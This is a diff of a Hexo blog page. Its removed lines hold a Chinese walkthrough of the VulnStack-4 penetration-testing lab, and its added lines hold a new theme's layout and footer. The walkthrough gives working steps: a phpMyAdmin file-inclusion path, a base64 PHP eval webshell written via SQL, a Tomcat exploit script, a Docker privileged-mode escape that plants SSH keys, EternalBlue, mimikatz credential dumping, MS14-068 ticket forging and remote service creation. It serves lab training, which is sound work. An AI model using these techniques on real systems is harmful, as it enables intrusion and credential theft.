-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://http://192.168.0.105:2003/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
 
-<p><img src="/Users/shihiroshisakai/Downloads/20220403163321.png" alt="20220403163321"></p>
-<p>这里我们可以看到漏洞的确存在。那么我们就要想办法包含恶意文件拿shell了，我这里先想到的是使用包含日志的方式。在SQL处执行如下语句</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;&lt;?php phpinfo();?&gt;&#x27;</span><br></pre></td></tr></table></figure>
 
-<p>并在f12中查看sessionid，我们最后要访问的路径为：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?target=db_datadict.php%253f/../../../../../../../../../tmp/sess_sessionid</span><br></pre></td></tr></table></figure>
+    <a href="mailto:1181062873@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
 
-<p><img src="/Users/shihiroshisakai/Downloads/20220403164423.png" alt="20220403164423"></p>
-<p>这里我们看到的确是成功访问到含有我们写入的phpinfo的session文件的。接下来就可以写shell了，但不知道为啥，我这里写shell总是不成功。于是这里我换了个方法（和网上的大佬学的。。）。虽然session文件中没让我拿到shell，但phpinfo的出现说明session文件的确是可以解析PHP代码的，那我就直接利用session文件创建一个shell文件。执行sql语句</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT ‘&lt;?php file_put_contents(&quot;extrader.php&quot;,base64_decode(&quot;PD9waHAgZXZhbCgkX1BPU1RbMV0pPz4=&quot;));?&gt;’</span><br></pre></td></tr></table></figure>
 
-<p>写入后我们再一次访问session文件（访问后才能执行我们刚刚写入的创建shell文件的命令）</p>
-<p>然后蚁剑成功连接</p>
-<p><img src="/Users/shihiroshisakai/Downloads/20220404152030.png" alt="20220404152030"></p>
-<p>由于之前开环境的时候已经知道了这个phpMyAdmin是跑在docker容器中的，所以这里作为攻击者，我们要当作什么也不知道，然后去检测一下是否在容器中，一般有两种方法：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">检查/.dockerenv文件是否存在</span><br><span class="line">检查/proc/1/cgroup内是否包含&quot;docker&quot;等字符串。</span><br></pre></td></tr></table></figure>
 
-<p><img src="/Users/shihiroshisakai/Downloads/20220403181608.png" alt="20220403181608"></p>
-<p>这里的dockerenv文件的确存在，说明确实是跑在docker容器中的。</p>
-<p>按道理这个时候我们就已经可以准备想办法docker逃逸了，但是刚才在扫描的时候我们还扫到了一个tomcat，所以这里我们看一下tomcat这边有没有什么可以拿shell的地方。</p>
-<h3 id="Tomcat任意文件上传漏洞"><a href="#Tomcat任意文件上传漏洞" class="headerlink" title="Tomcat任意文件上传漏洞"></a>Tomcat任意文件上传漏洞</h3><p>我们知道Tomcat的漏洞比较出名的有CVE-2017-12615，CVE-2017-12615是Tomcat中间件的任意文件上传漏洞，但此漏洞影响范围是Apache Tomcat 7.0.0 – 7.0.79，我们靶机的Tomcat版本似乎不再影响范围之内，是实际中Tomcat 5-9均存在类似CVE-2017-12615的利用方式，同样可以类比运用，但这不归属于CVE-2017-12615漏洞。</p>
-<p>这里我们直接用kali自带的searchsploit来查找Tomcat的8.5.19版本的利用脚本：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">searchsploit tomcat 8.5.19   // 查找tomcat 8.5.19的利用脚本</span><br><span class="line">searchsploit -m /exploit/jsp/webapps/42966.py   //将利用脚本复制到当前的工作目录（-m参数）</span><br></pre></td></tr></table></figure>
 
-<p>![image-20220405230141346](&#x2F;Users&#x2F;shihiroshisakai&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20220405230141346.png)</p>
-<p>这里给出了我们可以使用42966.py脚本，我们用该脚本检测一下漏洞是否存在：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python 42966.py -u http://192.168.0.105:2002/</span><br></pre></td></tr></table></figure>
 
-<p><img src="/Users/shihiroshisakai/Downloads/20220404152221.png" alt="20220404152221"></p>
-<p>看样子漏洞的确是存在的，接下来就可以进行攻击了：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python 42966.py -u http://192.168.0.105:2002/ -p pwn</span><br></pre></td></tr></table></figure>
 
-<p><img src="/Users/shihiroshisakai/Downloads/20220404153336.png" alt="20220404153336"></p>
-<p>这样就成功弹回一个shell了（不过说实话这个shell真丑。。。）</p>
-<h2 id="Docker主机逃逸"><a href="#Docker主机逃逸" class="headerlink" title="Docker主机逃逸"></a>Docker主机逃逸</h2><p>同样的，用脚本跑出的这个shell也是在docker中的，我们要想办法从docker中逃逸，拿到主机shell。</p>
-<h3 id="利用–privileged特权模式逃逸"><a href="#利用–privileged特权模式逃逸" class="headerlink" title="利用–privileged特权模式逃逸"></a>利用–privileged特权模式逃逸</h3><p>特权模式于版本0.6时被引入Docker，允许容器内的root拥有外部物理机root权限，而此前容器内root用户仅拥有外部物理机普通用户权限。</p>
-<p>使用特权模式启动容器，可以获取大量设备文件访问权限。因为当管理员执行docker run —privileged时，Docker容器将被允许访问主机上的所有设备，并可以执行mount命令进行挂载。</p>
-<p>当控制使用特权模式启动的容器时，docker管理员可通过mount命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，此外还可以通过写入计划任务等方式在宿主机执行命令。</p>
-<p>在之前扫描时我们看到了目标主机的22端口是开着的，也就是说如果，我们能够向主机中写入任意文件，我们就可以通过写ssh密钥的方式实现ssh免密登陆。</p>
-<p>说干就干，我们先在根目录下创建一个用于挂载主机的目录hack，并用mount命令将外部宿主机磁盘设备挂载到hack下</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount /dev/sda1 /hack</span><br></pre></td></tr></table></figure>
 
-<p>![image-20220405231951613](&#x2F;Users&#x2F;shihiroshisakai&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20220405231951613.png)</p>
-<p>挂载成功了，此时我们就可以通过访问容器内部的&#x2F;hack路径来达到访问整个宿主机的目的。</p>
-<p>我们看一下home中的ubuntu用户目录：</p>
-<p><img src="/Users/shihiroshisakai/Downloads/20220404163426.png" alt="20220404163426"></p>
-<p>发现这里有.ssh目录，那么我们就可以往该文件夹内写密钥了。</p>
-<p>先在攻击机本地生成密钥：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -f hack</span><br><span class="line">chmod 600 hack    // 赋予执行权限</span><br></pre></td></tr></table></figure>
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1181062873" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1181062873" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
 
-<p>由于我用echo无论如何也写不进文件，所以这里我直接在服务器上开了个http服务器，然后在容器中下载hack.pub文件，最后执行：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp hack.pub /hack/home/ubuntu/.ssh/authorized_keys </span><br></pre></td></tr></table></figure>
 
-<p>随后ssh连接就行了</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i hack ubuntu@192.168.0.105</span><br></pre></td></tr></table></figure>
 
-<p><img src="/Users/shihiroshisakai/Downloads/20220404175951.png" alt="20220404175951"></p>
-<p>连接成功，这里我们用msf生成木马并上传到ubuntu中，并在本地开启监听，然后在ubuntu中运行木马文件。</p>
-<p><img src="/Users/shihiroshisakai/Downloads/20220404180623.png" alt="20220404180623"></p>
-<p>这样msf就已经上线了。</p>
-<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><h3 id="WIN7"><a href="#WIN7" class="headerlink" title="WIN7"></a>WIN7</h3><p>剩下就开始挂代理打了，我们发现它有两张网卡，所以直接扫描内网网卡主机存活：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/discovery/udp_probe</span><br></pre></td></tr></table></figure>
 
-<p><img src="/Users/shihiroshisakai/Downloads/20220404190041.png" alt="20220404190041"></p>
-<p>这里我们扫到了两台机子，分别是192.168.183.129和192.168.246.130。通过端口扫描又知道他们都开了445端口（这里忘截图了）</p>
-<p>那我们就本能地想到永恒之蓝漏洞了，经过扫描发现这里的两台主机都可能存在永恒之蓝漏洞（这里又忘截图了。。。）</p>
-<p>既然扫到了，那直接打就行了：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set rhost 192.168.183.129</span><br><span class="line">set lport 4444</span><br><span class="line">set AutoRunScript post/windows/manage/migrate             // 自动迁移进程</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
 
-<p>这里总是在最后一步失败，一开始不知道为啥，到网上一看发现网上的大佬们并不是用的msf自带的代理，于是抱着试一试的心态我换ew重新试了一遍</p>
-<p><img src="/Users/shihiroshisakai/Downloads/20220404210514.png" alt="20220404210514"></p>
-<p>它居然就行了。。。不过ew的连接特别容易断，于是这里从网上大佬们那发现了一个go写的代理工具chisel，十分稳定和强大，项目地址：<a target="_blank" rel="noopener" href="https://github.com/jpillora/chisel">https://github.com/jpillora/chisel</a> 。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./chisel server -p 2336 --socks5    //向跳板机上面上传./chisel文件并打开服务端</span><br></pre></td></tr></table></figure>
 
-<p><img src="/Users/shihiroshisakai/Downloads/20220406173846.png" alt="20220406173846"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./chisel client 192.168.111.139:2333 socks  //攻击机上执行</span><br></pre></td></tr></table></figure>
 
-<p><img src="/Users/shihiroshisakai/Downloads/20220406173905.png" alt="20220406173905"></p>
-<p>这样拿到的连接就十分稳定了。</p>
-<h3 id="DC"><a href="#DC" class="headerlink" title="DC"></a>DC</h3><p>剩下就开始进攻域控了，看一下当前权限</p>
-<p><img src="/Users/shihiroshisakai/Downloads/20220406174408.png" alt="20220406174408"></p>
-<p>system，非常nice，那么我们就可以直接mimikatz抓取明文密码了。</p>
-<p>抓取命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug   //提取权限</span><br><span class="line">sekurlsa::logonpasswords   //抓取密码</span><br></pre></td></tr></table></figure>
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
 
-<p>就在这个时候，意外发生了</p>
-<p><img src="/Users/shihiroshisakai/Downloads/20220406174343.png" alt="20220406174343"></p>
-<p>好家伙一个权限问题给我整不会了，我们不是已经是system权限了吗？那就先放开这条路，去看看有没有高权限的令牌可用</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use incognito</span><br><span class="line">list_tokens-u    //列出可用的token</span><br></pre></td></tr></table></figure>
-
-<p><img src="/Users/shihiroshisakai/Downloads/20220406174008.png" alt="20220406174008"></p>
-<p>那就先抓个域用户douser的令牌吧，毕竟只有它有权限查看域内信息。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">incognito_token “DEMO \douser”  //抓取DEMO域中的域用户douser</span><br></pre></td></tr></table></figure>
-
-<p><img src="/Users/shihiroshisakai/Downloads/20220406175504.png" alt="20220406175504"></p>
-<p>收集一波域内信息：</p>
-<p><img src="/Users/shihiroshisakai/Downloads/20220406175647.png" alt="20220406175647"></p>
-<p><img src="/Users/shihiroshisakai/Downloads/20220406175716.png" alt="20220406175716"></p>
-<p>除了上述信息外，还查了一下域管，发现只有Administrator（这里忘截图了。。。），一般来说普通域用户是登录不了域控的，所以用dosuer远控域控是不太可能了。原本我都打算搬出kerberost了，但因为实在是不想爆破（这里之前看过了，并没有可以直接拿来传递的高权限票据，所以kerberost攻击只能去爆破了。。。），于是没骨气的我偷看了一下网上大佬们的wp。然后就看到了一件我很不能接受的事情，网上的大佬们抓了个本地system的令牌，然后mimikatz就提权成功了。看得我一脸懵，我们本来不就是system权限吗？虽然不知道为啥，但抱着好奇心我还是试了一下：</p>
-<p><img src="/Users/shihiroshisakai/Downloads/20220406174631.png" alt="20220406174631"></p>
-<p>虽然成功了，但也彻底给我整不会了。。。</p>
-<p>这个问题之后探究，先接着往下打，mimikatz抓取明文密码。</p>
-<p><img src="/Users/shihiroshisakai/Downloads/20220406174733.png" alt="20220406174733"></p>
-<p>这里抓到了douser这个域用户的密码，想想只有个普通域用户的明文密码能怎样打到域控。。。MS-14068！</p>
-<p>我们先把MS-14068.exe传到域控上，注意不要传到它默认的Windows&#x2F;System32下，否则的话会执行失败。如下图</p>
-<p><img src="/Users/shihiroshisakai/Downloads/20220406174924.png" alt="20220406174924"></p>
-<p>然后接下来我们直接用MS-14068制作高权限票据</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MS14-068.exe -u 域用户@域名 -s 该与用户的sid -d 域控ip或名称 -p 该与用户的密码</span><br></pre></td></tr></table></figure>
-
-<p><img src="/Users/shihiroshisakai/Downloads/20220405203528.png" alt="20220405203528"></p>
-<p>如上图，成功生成票据。接下来我们用mimikatz注入内存就好</p>
-<p>Kerberos:: ptc ‘之前生成的票据名’</p>
-<p><img src="/Users/shihiroshisakai/Downloads/20220405203517.png" alt="20220405203517"></p>
-<p>大功告成啦。我们看一下能不能远程访问到域控</p>
-<p><img src="/Users/shihiroshisakai/Downloads/20220405203621.png" alt="20220405203621"></p>
-<p>可以，那剩下的就简单了，先用copy命令向域控传一个正向马，msf挂代理监听，最后sc创建服务执行这个正向马。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc \\域控名 create shell binpath= &quot;c:\icesoul.exe&quot;    //创建一个服务</span><br><span class="line">sc \\域控名 start shell   //执行这个服务</span><br></pre></td></tr></table></figure>
-
-<p><img src="/Users/shihiroshisakai/Downloads/20220405212008.png" alt="20220405212008"></p>
-<p><img src="/Users/shihiroshisakai/Downloads/20220405212020.png" alt="20220405212020"></p>
-<p>这里虽说报了1053的错，但实际上已经执行成功了。</p>
-<p>域控上线：</p>
-<p><img src="/Users/shihiroshisakai/Downloads/20220405211654.png" alt="20220405211654"></p>
-<p><img src="/Users/shihiroshisakai/Downloads/20220405211737.png" alt="20220405211737"></p>
-<p>参考文章：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/244704.html">https://www.freebuf.com/articles/network/244704.html</a></p>
-
-      
+</div>
+        </div>
     </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2022/04/08/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-VulnStack-4/" data-id="cl1pxqdzu0001tou8dflqgliz" data-title="记一次靶场练习-VulnStack-4" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
 
+    
+</div>
 
+<script>
+    $(function () {
+        let coverSlider = $('.carousel');
 
-  
-    <article id="post-hello-world" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2022/04/07/hello-world/" class="article-date">
-  <time class="dt-published" datetime="2022-04-07T13:43:40.794Z" itemprop="datePublished">2022-04-07</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
+        //用户触摸轮播自动 restartPlay 是否生效
+        let initUserPressedOrDraggedActive = false
+
+        //用户触摸轮播自动 restartPlay
+        function initUserPressedOrDragged(instance) {
+            setInterval(() => {
+                if (instance.pressed || instance.dragged) {
+                    // console.log('initUserPressedOrDragged: ',instance.pressed,instance.dragged)
+                    restartPlay()
+                }
+            }, 1000)
+        }
+
+        coverSlider.carousel({
+            duration: Number('120'),
+            fullWidth: true,
+            indicators: 'true' === 'true',
+            onCycleTo() {
+                if (!initUserPressedOrDraggedActive) {
+                    // console.log('initUserPressedOrDraggedActive')
+                    initUserPressedOrDragged(this)
+                    initUserPressedOrDraggedActive = true
+                }
+            },
+        })
+
+        let carouselIntervalId;
         
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2022/04/07/hello-world/">Hello World</a>
-    </h1>
-  
+        // Loop to call the next cover article picture.
+        let autoCarousel = function () {
+            carouselIntervalId = setInterval(function () {
+                coverSlider.carousel('next');
+            }, 5000);
+        };
+        autoCarousel();
+        
 
-      </header>
+        function restartPlay() {
+            
+            clearInterval(carouselIntervalId);
+            autoCarousel();
+            
+        };
+
+        
+        // prev and next cover post.
+        $('#prev-cover').click(function () {
+            coverSlider.carousel('prev');
+            restartPlay();
+        });
+        $('#next-cover').click(function () {
+            coverSlider.carousel('next');
+            restartPlay();
+        });
+        
+    });
+</script>
+
+
+
+<main class="content">
+
     
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-
-      
+    <div id="indexCard" class="index-card">
+        <div class="container ">
+            <div class="card">
+                <div class="card-content">
+                    
+                        <div class="dream">
+    
+    <div class="title center-align">
+        <i class="far fa-lightbulb"></i>&nbsp;&nbsp;我的梦想
     </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2022/04/07/hello-world/" data-id="cl1pxqdzq0000tou8ew7xfcex" data-title="Hello World" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-
-
-</section>
-        
-          <aside id="sidebar">
-  
     
-
-  
-    
-
-  
-    
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Archives</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a></li></ul>
+    <div class="row">
+        <div class="col l8 offset-l2 m10 offset-m1 s10 offset-s1 center-align text">
+            不是每个人都应该像我这样去建造一座水晶大教堂，但是每个人都应该拥有自己的梦想，设计自己的梦想，追求自己的梦想，实现自己的梦想。梦想是生命的灵魂，是心灵的灯塔，是引导人走向成功的信仰。有了崇高的梦想，只要矢志不渝地追求，梦想就会成为现实，奋斗就会变成壮举，生命就会创造奇迹。——罗伯·舒乐
+        </div>
     </div>
-  </div>
+</div>
+
+                    
+
+                    
+
+                    
+
+                    
+                    <div id="recommend-sections" class="recommend">
+                        
 
 
-  
+
+                    </div>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
     
-  <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
-    <div class="widget">
-      <ul>
-        
-          <li>
-            <a href="/2022/04/08/%E5%92%8C%E5%AE%A4%E5%8F%8B%E8%89%B0%E8%BE%9B%E7%9A%84%E4%B8%80%E6%AC%A1%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/">和室友艰辛的一次打靶记录</a>
-          </li>
-        
-          <li>
-            <a href="/2022/04/08/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-VulnStack-4/">记一次靶场练习-VulnStack-4</a>
-          </li>
-        
-          <li>
-            <a href="/2022/04/07/hello-world/">Hello World</a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
 
-  
-</aside>
+    
+
+    <!-- 所有文章卡片 -->
+    <article id="articles" class="container articles">
+        <div class="row article-row">
+            
+             <!-- 隐藏某个文章 -->
+            <div class="article col s12 m6 l4" data-aos="zoom-in">
+                <div class="card">
+                    <a href="/2022/04/08/%E5%92%8C%E5%AE%A4%E5%8F%8B%E8%89%B0%E8%BE%9B%E7%9A%84%E4%B8%80%E6%AC%A1%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/">
+                        <div class="card-image">
+                            
+                            
+                            <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="和室友艰辛的一次打靶记录">
+                            
+                            <span class="card-title">和室友艰辛的一次打靶记录</span>
+                        </div>
+                    </a>
+
+                    <div class="card-content article-content">
+                        <div class="summary block-with-text">
+                            
+                                和室友艰辛的一次打靶记录之前室友找到了个非常好的靶场，说和我一起打。我们用了四天时间，经历了巨多磨难，总算是让所有机器全部上线（这其中大部分都是我室友打下来的，我有点像个混子一样。。。），由于大部分是舍友打下来的，所以这里我从头到尾复现一下
+                            
+                        </div>
+                        <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-04-08
+                            </span>
+                            <span class="publish-author">
+                                
+                                <i class="fas fa-user fa-fw"></i>
+                                John Doe
+                                
+                            </span>
+                        </div>
+                    </div>
+
+                    
+                </div>
+            </div>
+              <!-- 隐藏某个文章 -->
+            
+             <!-- 隐藏某个文章 -->
+            <div class="article col s12 m6 l4" data-aos="zoom-in">
+                <div class="card">
+                    <a href="/2022/04/08/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-VulnStack-4/">
+                        <div class="card-image">
+                            
+                            
+                            <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="记一次靶场练习-VulnStack-4">
+                            
+                            <span class="card-title">记一次靶场练习-VulnStack-4</span>
+                        </div>
+                    </a>
+
+                    <div class="card-content article-content">
+                        <div class="summary block-with-text">
+                            
+                                记一次靶场练习-VulnStack-4这里先给出拓扑图（图是网上贴的，我这边HOST1的IP是192.168.111.138）
+
+配置环境在这里就不记录了，直接从开打写起。
+信息收集由于默认已经知道了HOST1的ip，但直接访问ip显示40
+                            
+                        </div>
+                        <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-04-08
+                            </span>
+                            <span class="publish-author">
+                                
+                                <i class="fas fa-user fa-fw"></i>
+                                John Doe
+                                
+                            </span>
+                        </div>
+                    </div>
+
+                    
+                </div>
+            </div>
+              <!-- 隐藏某个文章 -->
+            
+             <!-- 隐藏某个文章 -->
+            <div class="article col s12 m6 l4" data-aos="zoom-in">
+                <div class="card">
+                    <a href="/2022/04/07/hello-world/">
+                        <div class="card-image">
+                            
+                            
+                            <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="Hello World">
+                            
+                            <span class="card-title">Hello World</span>
+                        </div>
+                    </a>
+
+                    <div class="card-content article-content">
+                        <div class="summary block-with-text">
+                            
+                                Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hex
+                            
+                        </div>
+                        <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-04-07
+                            </span>
+                            <span class="publish-author">
+                                
+                                <i class="fas fa-user fa-fw"></i>
+                                John Doe
+                                
+                            </span>
+                        </div>
+                    </div>
+
+                    
+                </div>
+            </div>
+              <!-- 隐藏某个文章 -->
+            
+        </div>
+    </article>
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
         
-      </div>
-      <footer id="footer">
-  
-  <div class="outer">
-    <div id="footer-info" class="inner">
-      
-      &copy; 2022 John Doe<br>
-      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
     </div>
-  </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="/libs/aplayer/Meting.min.js"></script>
+
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2022</span>
+            
+            <a href="/about" target="_blank">John Doe</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;Total visits:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;Total visitors:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/blinkfox" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:1181062873@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1181062873" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1181062873" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
 </footer>
 
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;Search</span>
